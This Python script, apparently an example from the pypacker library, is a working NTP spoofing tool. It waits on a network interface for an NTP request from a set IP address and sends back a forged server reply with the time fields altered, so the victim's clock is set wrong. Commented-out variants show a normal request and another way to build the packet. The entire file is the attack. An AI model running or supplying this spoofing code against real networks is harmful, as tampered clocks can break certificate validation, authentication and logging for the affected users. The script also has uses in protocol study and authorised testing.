"""Simple NTP spoofing tool."""
from pypacker.layer12.ethernet import Ethernet
from pypacker.layer3 import ip
from pypacker.layer4.udp import UDP
from pypacker.layer567 import ntp

from pypacker import psocket

# interface to listen on
IFACE	= "eth1"
# source address which commits a NTP request and we send a wrong answer
IP_SRC	= "192.168.178.27"

#
# normal NTP request
#
#psock_req	= psocket.SocketHndl(iface_name=IFACE, mode=psocket.SocketHndl.MODE_LAYER_3)
#ntp_req		= ip.IP(src_s=IP_SRC, dst_s="188.138.9.208", p=ip.IP_PROTO_UDP) +\
#			UDP(sport=1234, dport=123) +\
#			ntp.NTP(li=ntp.NO_WARNING, v=3, mode=ntp.CLIENT)
#print("sending NTP request and waiting for answer..")
#answer	= psock_req.sr(ntp_req)[0][ntp.NTP]

#print("answer is: %s" % answer)
#print("seconds since 1.1.1900: %d" % struct.unpack(">I", answer.transmit_time[0:4])[0])
#psock_req.close()


#
# spoof NTP response
#
print("waiting for NTP request")
psock	= psocket.SocketHndl(iface_name=IFACE, timeout=600)
filter	= lambda p: p[ntp.NTP] is not None and p[ip.IP].src_s == IP_SRC
answer	= psock.recvp(filter_match_recv=filter)[0]
answer_ntp	= answer[ntp.NTP]

print("got NTP packet: %s" % answer_ntp)

ntp_answer_send	= Ethernet(dst=answer[Ethernet].src, src=answer[Ethernet].dst) +\
			ip.IP(src=answer[ip.IP].dst, dst_s=IP_SRC, p=ip.IP_PROTO_UDP) +\
			UDP(sport=answer[UDP].dport, dport=answer[UDP].sport) +\
			ntp.NTP(li=ntp.NO_WARNING, v=3, mode=ntp.SERVER, stratum=2, interval=4,
				update_time=answer_ntp.transmit_time,
				originate_time=answer_ntp.transmit_time,
				receive_time=b"\x00" * 4 + answer_ntp.transmit_time[4:],
				transmit_time=b"\x00" * 4 + answer_ntp.transmit_time[4:])

# alternative packet creation
#ntp_answer_send	= answer.create_reverse()
#layer_ntp		= ntp_answer_send[ntp.NTP]
#layer_ntp.mode		= ntp.SERVER
#layer_ntp.originate_time = answer_ntp.transmit_time
#layer_ntp.receive_time	= layer_ntp.transmit_time = b"\x00"*4 + answer_ntp.transmit_time[4:]

psock.send(ntp_answer_send.bin())
psock.close()
